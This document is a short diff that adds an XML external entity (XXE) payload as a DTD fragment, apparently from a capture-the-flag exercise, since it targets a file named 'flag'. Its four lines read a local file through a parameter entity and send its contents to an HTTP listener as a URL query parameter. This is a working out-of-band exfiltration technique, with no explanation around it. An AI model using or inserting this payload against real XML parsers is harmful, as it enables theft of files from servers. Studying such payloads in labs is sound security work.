@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM 'file:///d://flag'>
+<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:8000/?content=%file;'>">
+%payload;
+%send;
